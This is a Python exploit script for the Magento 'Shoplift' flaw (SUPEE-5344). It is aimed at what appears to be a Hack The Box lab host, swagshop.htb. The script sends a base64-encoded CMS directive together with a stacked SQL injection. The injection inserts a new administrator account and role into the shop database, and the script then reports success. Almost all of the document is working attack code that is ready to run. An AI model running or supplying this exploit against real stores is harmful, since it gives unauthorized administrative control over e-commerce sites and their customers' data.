"""
Exploit Title : Magento Shoplift exploit (SUPEE-5344)
Author        : Manish Kishan Tanwar AKA error1046
Date          : 25/08/2015
Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,ishan Singh and ritu rathi
Thanks to     : Zero cool, code breaker ICA, Team indishell, my father , rr mam, jagriti and DON
Debugged At   : Indishell Lab(originally developed by joren)

Magento shoplift bug originally discovered by CheckPoint team
http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/
This python script developed by joren but it was having some bug because
of which it was not working properly. If magento version is vulnerable,
this script will create admin account with username forme and password form.

TL: Modified to work on Python 3, adhere to PEP8 and tidied code
"""
import base64

import requests


# Specify what username and password to set
username = "username"
password = "password"

# Make sure to include http:// prefix
# Make sure to not include trailing backslash
target = "http://swagshop.htb/index.php"
target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

print(f"[+] Target URL: {target_url}")
print("[+] Account to create on admin panel...")
print(f"[+] Username: {username}")
print(f"[+] Password: {password}")

# Define query
q = f"SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"

filer_payload = f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{q}"
filter_payload_encoded = base64.b64encode(filer_payload.encode("utf-8"))

# Payload: {{block type=Adminhtml/report_search_grid output=getCsvFile}}
directive_payload = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"

data = {
    "___directive": directive_payload,
    "filter": filter_payload_encoded,
    "forwarded": 1
}

r = requests.post(target_url,
                  data=data)

print(f"[+] Status code: {r.status_code}")
if r.ok:
    print("[+] Success!")
    print(f"[+] Check {target}/admin")
else:
    print("[+] Error!")
